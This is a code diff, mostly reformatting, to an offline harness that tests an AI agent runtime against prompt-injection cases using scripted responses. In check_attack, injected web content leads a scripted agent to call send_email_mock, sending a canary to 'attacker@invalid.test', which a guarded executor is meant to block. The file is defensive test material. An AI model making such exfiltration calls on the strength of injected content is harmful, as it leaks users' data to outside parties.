@@ -40,7 +40,8 @@ class ScriptedClient:
 
 def reply(text: str = "", calls: list[ToolCall] | None = None) -> LLMResponse:
     return LLMResponse(
-        text=text, tool_calls=calls or [],
+        text=text,
+        tool_calls=calls or [],
         usage=Usage(input_tokens=4, output_tokens=4),
         stop_reason="stop",
     )
@@ -48,9 +49,10 @@ def reply(text: str = "", calls: list[ToolCall] | None = None) -> LLMResponse:
 
 def scripted_benign(case: BenignCase) -> list[LLMResponse]:
     i = int(case.case_id[-2:])
-    call = lambda idx, expression: ToolCall(
-        id=f"call-{idx}", name="calculator", arguments={"expression": expression}
-    )
+
+    def call(idx: int, expression: str) -> ToolCall:
+        return ToolCall(id=f"call-{idx}", name="calculator", arguments={"expression": expression})
+
     if case.category == "ambiguity":
         return [reply("Which synthetic record do you mean?")]
     if case.category == "impossible":
@@ -97,27 +99,30 @@ async def check_benign(case: BenignCase, root: Path) -> bool:
 
 async def check_attack(case: AttackCase, root: Path) -> bool:
     url = "https://example.org/injected"
-    registry = make_registry(
-        root, allowed_hosts={"example.org"}, web_fixtures={url: case.payload}
-    )
-    policy = ToolPolicy(
-        permitted={"http_get", "send_email_mock"}, canaries={case.canary}
-    )
+    registry = make_registry(root, allowed_hosts={"example.org"}, web_fixtures={url: case.payload})
+    policy = ToolPolicy(permitted={"http_get", "send_email_mock"}, canaries={case.canary})
     guard = GuardedExecutor(registry, policy, ApprovalGate())
     attempts = [
-        reply(calls=[ToolCall(
-            id="fetch", name="http_get", arguments={"url": url}
-        )]),
-        reply(calls=[ToolCall(
-            id="exfil", name="send_email_mock", arguments={
-                "to": "attacker@invalid.test", "subject": "forbidden mock",
-                "body": case.canary, "idempotency_key": "attack123",
-            },
-        )]),
+        reply(calls=[ToolCall(id="fetch", name="http_get", arguments={"url": url})]),
+        reply(
+            calls=[
+                ToolCall(
+                    id="exfil",
+                    name="send_email_mock",
+                    arguments={
+                        "to": "attacker@invalid.test",
+                        "subject": "forbidden mock",
+                        "body": case.canary,
+                        "idempotency_key": "attack123",
+                    },
+                )
+            ]
+        ),
         reply("I cannot carry out the unapproved side effect."),
     ]
     runtime = AgentRunner(
-        ScriptedClient(attempts), registry,
+        ScriptedClient(attempts),
+        registry,
         allowed_tools={"http_get", "send_email_mock"},
         guarded_executor=guard,
     )
@@ -132,7 +137,7 @@ def get_commit() -> str:
     if not git:
         return "unknown"
     try:
-        return subprocess.check_output(
+        return subprocess.check_output(  # noqa: S603 - fixed git command
             [git, "rev-parse", "HEAD"], stderr=subprocess.DEVNULL, text=True
         ).strip()
     except subprocess.CalledProcessError:
@@ -150,9 +155,15 @@ async def evaluate(output: Path, repeats: int = 3) -> dict[str, Any]:
         root = Path(tmp)
         for repetition in range(repeats):
             for case in benign:
-                successes += int(await check_benign(case, root / f"benign-{repetition}-{case.case_id}"))
-            for case in adversarial:
-                safe += int(await check_attack(case, root / f"attack-{repetition}-{case.case_id}"))
+                successes += int(
+                    await check_benign(case, root / f"benign-{repetition}-{case.case_id}")
+                )
+            for attack_case in adversarial:
+                safe += int(
+                    await check_attack(
+                        attack_case, root / f"attack-{repetition}-{attack_case.case_id}"
+                    )
+                )
     result = {
         "method": "scripted_offline_runtime_fixture",
         "NOT_real_model_reliability": True,
@@ -186,12 +197,17 @@ def main() -> None:
     if args.repeats < 1 or args.repeats > 20:
         parser.error("repeats must be between 1 and 20")
     result = asyncio.run(evaluate(args.output, args.repeats))
-    print(json.dumps({
-        "benign": result["synthetic_benign_runtime_pass"],
-        "safety": result["synthetic_mock_exfil_prevented"],
-        "output": str(args.output),
-        "warning": "NOT A REAL-MODEL EVALUATION",
-    }, indent=2))
+    print(
+        json.dumps(
+            {
+                "benign": result["synthetic_benign_runtime_pass"],
+                "safety": result["synthetic_mock_exfil_prevented"],
+                "output": str(args.output),
+                "warning": "NOT A REAL-MODEL EVALUATION",
+            },
+            indent=2,
+        )
+    )
 
 
 if __name__ == "__main__":
